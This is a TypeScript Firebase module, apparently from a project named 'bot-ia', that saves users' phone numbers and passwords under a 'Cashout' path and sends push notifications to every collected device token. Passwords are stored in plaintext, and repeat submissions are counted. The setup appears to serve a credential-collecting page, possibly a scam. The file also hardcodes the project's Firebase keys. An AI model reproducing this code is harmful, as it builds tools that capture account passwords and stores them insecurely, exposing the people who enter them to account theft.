import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set, get, update, push } from 'firebase/database';
import { getMessaging, getToken, onMessage } from 'firebase/messaging';

const firebaseConfig = {
  apiKey: "AIzaSyDj1qqCBztEpF31n9UU3DFKwiymc2Bd-iM",
  authDomain: "bot-ia-20e75.firebaseapp.com",
  databaseURL: "https://bot-ia-20e75-default-rtdb.firebaseio.com",
  projectId: "bot-ia-20e75",
  storageBucket: "bot-ia-20e75.appspot.com",
  messagingSenderId: "601684351023",
  appId: "1:601684351023:android:e94d0ab92f512c4cb80eda"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const messaging = getMessaging(app);

export { messaging };

export const saveCashoutData = async (numero: string, senha: string) => {
  const userRef = ref(database, `Cashout/${numero}`);
  
  try {
    const snapshot = await get(userRef);
    
    if (snapshot.exists()) {
      // Usuário já existe, apenas incrementa vezes
      const currentData = snapshot.val();
      await update(userRef, {
        vezes: (currentData.vezes || 1) + 1,
        data: new Date().toISOString()
      });
      return { exists: true };
    } else {
      // Novo usuário
      await set(userRef, {
        numero,
        senha,
        data: new Date().toISOString(),
        vezes: 1
      });
      return { exists: false };
    }
  } catch (error) {
    console.error('Error saving to Firebase:', error);
    throw error;
  }
};

export const saveFCMToken = async (token: string) => {
  const tokensRef = ref(database, 'FCMTokens');
  try {
    await push(tokensRef, {
      token,
      data: new Date().toISOString()
    });
    console.log('FCM Token saved:', token);
  } catch (error) {
    console.error('Error saving FCM token:', error);
    throw error;
  }
};

export const getAllFCMTokens = async (): Promise<string[]> => {
  const tokensRef = ref(database, 'FCMTokens');
  try {
    const snapshot = await get(tokensRef);
    if (snapshot.exists()) {
      const data = snapshot.val();
      return Object.values(data).map((item: any) => item.token);
    }
    return [];
  } catch (error) {
    console.error('Error getting FCM tokens:', error);
    return [];
  }
};

export const sendPushNotification = async (title: string, body: string) => {
  const tokens = await getAllFCMTokens();
  
  if (tokens.length === 0) {
    console.log('No FCM tokens found');
    return;
  }

  const notificationData = {
    title,
    body,
    tokens
  };

  try {
    const response = await fetch('https://fcm.googleapis.com/fcm/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'key=YOUR_SERVER_KEY_HERE'
      },
      body: JSON.stringify({
        registration_ids: tokens,
        notification: {
          title,
          body,
          icon: '/favicon.ico'
        }
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send notification');
    }

    console.log('Notifications sent successfully');
  } catch (error) {
    console.error('Error sending push notification:', error);
    throw error;
  }
};

export const initializeFCM = async (): Promise<string | null> => {
  try {
    const token = await getToken(messaging, {
      vapidKey: 'YOUR_VAPID_KEY_HERE'
    });
    
    if (token) {
      await saveFCMToken(token);
      return token;
    } else {
      console.log('No registration token available');
      return null;
    }
  } catch (error) {
    console.error('Error getting FCM token:', error);
    return null;
  }
};

onMessage(messaging, (payload) => {
  console.log('Message received: ', payload);
  if (payload.notification) {
    new Notification(payload.notification.title || 'Notificação', {
      body: payload.notification.body,
      icon: payload.notification.icon || '/favicon.ico'
    });
  }
});
